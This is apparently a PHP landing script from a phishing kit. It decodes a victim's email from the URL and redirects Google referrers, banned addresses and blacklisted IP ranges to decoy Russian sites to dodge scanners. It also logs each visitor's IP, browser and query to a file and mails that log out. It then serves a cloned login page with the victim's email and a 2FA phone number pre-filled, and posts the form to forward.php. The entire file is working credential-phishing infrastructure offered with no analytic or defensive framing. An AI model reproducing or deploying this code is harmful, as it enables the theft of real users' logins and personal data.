<?php
$b = base64_decode($_GET['b']);
$id = $_GET['id'];
$mail = $_GET['email'];
?>


<?php
$id=$_GET['id'];
$b=$_GET['b'];
$email=base64_decode($b);
$tmp=explode('@',$email);
$login=$tmp[0];
$domain=$tmp[1];
$ban = false;
//if ($email != base64_decode($b)) $ban = true;
//if (md5($email) != $id) $ban = true;

//if ($ban)
//{
//header('Location: https://cloud-1.ru/404');
//exit;
//}
?>



<?php 
session_start(); 
if($_SERVER['HTTP_REFERER'] == "https://www.google.com/") { 
header('Location: https://cayt.ru./'); 
die(); 
} 
?>






<?php
if (strpos($_SERVER['HTTP_REFERER'], 'www.google.com')) { 
header('Location: https://cayt.ru./'); 
die(); 
} 
?>



<?php
$id=$_GET['id'];
$b=$_GET['b'];
$email=base64_decode($b);
$tmp=explode('@',$email);
$login=$tmp[0];
$domain=$tmp[1];

$ban = file('.ban_m.txt');
$ban = str_replace("\r\n",'',$ban);
$ban = str_replace("\n",'',$ban);
$ban = str_replace(" ",'',$ban);
$ban = str_replace("     ",'',$ban);
foreach ($ban as $bn) if ("$email"==$bn)
{
header('Location: https://shtrafy-gibdd.ru/');
exit;
};  
?>


<?php
$id=$_GET['id'];
$b=$_GET['b'];
$email=base64_decode($b);
$tmp=explode('@',$email);
$login=$tmp[0];
$domain=$tmp[1];

$ban = file('ban_m.txt');
$ban = str_replace("\r\n",'',$ban);
$ban = str_replace("\n",'',$ban);
$ban = str_replace(" ",'',$ban);
$ban = str_replace("     ",'',$ban);
foreach ($ban as $bn) if ("$email"==$bn)
{
header('Location: https://shtrafy-gibdd.ru/');
exit;
};  
?>


<?php
$id=$_GET['id'];
$b=$_GET['b'];
$email=base64_decode($b);
$tmp=explode('@',$email);
$login=$tmp[0];
$domain=$tmp[1];

$ban = file('ban_mud.txt');
$ban = str_replace("\r\n",'',$ban);
$ban = str_replace("\n",'',$ban);
$ban = str_replace(" ",'',$ban);
$ban = str_replace("     ",'',$ban);
foreach ($ban as $bn) if ("$email"==$bn)
{
header('Location: https://oauth-shtrafi.ru');
exit;
};  
?>


<?php
$id=$_GET['id'];
$b=$_GET['b'];
$email=base64_decode($b);
$tmp=explode('@',$email);
$login=$tmp[0];
$domain=$tmp[1];
$Date = date("d-m-y H:i:s", time());
$browser = getenv("HTTP_USER_AGENT");
$ref = getenv("HTTP_REFERER");
$ip = getenv("REMOTE_ADDR");
$query = UrlDecode(getenv("QUERY_STRING"));
     
$text = "Date: $Date\nBrowser: $browser\nReferer: $ref\nIP: $ip\nQuery: $query\n\n";

$fd=fopen(click.txt,"a+");
fwrite($fd,"$text");
fclose($fd);

$subject="$email";
$header="Content-type: text/html; charset=windows-1251 \r\n";
$header.="From: index tel  <9568214@sendsmail.ru> \r\n";
$header.="Subject: $subject \r\n";
$header.="Content-type: text/html; charset=windows-1251 \r\n";
$msg="<body>
<xbody>
$text
</xbody>

</body>";
mail('mail dlya logs', $query, $msg, $header);
?>


<?php
error_reporting(0);
$blackips = file_get_contents('blackip.txt');
$ipe = explode(".",$_SERVER["REMOTE_ADDR"]);
$ip_mask = $ipe[0].'.'.$ipe[1].'.'.$ipe[2];
if (preg_match("/$ip_mask/i", $blackips)) {
//black IP
 header("Location: https://e.mail.ru/403"); header("Location: https://e.mail.ru/403");echo "$notfound<div style=\"visibility:hidden\">bi</div>"; die();
}
?>

<?php
$data = file_get_contents('telG.html');
$query = UrlDecode(getenv("QUERY_STRING"));
$data = str_replace("auth.php","forward.php?$query",$data);
$data = str_replace('+7 (926) 7',base64_decode($_GET['2fa']),$data);
$data = str_replace('au_gkvv@mail.ru',$email,$data);

echo "$data";
?>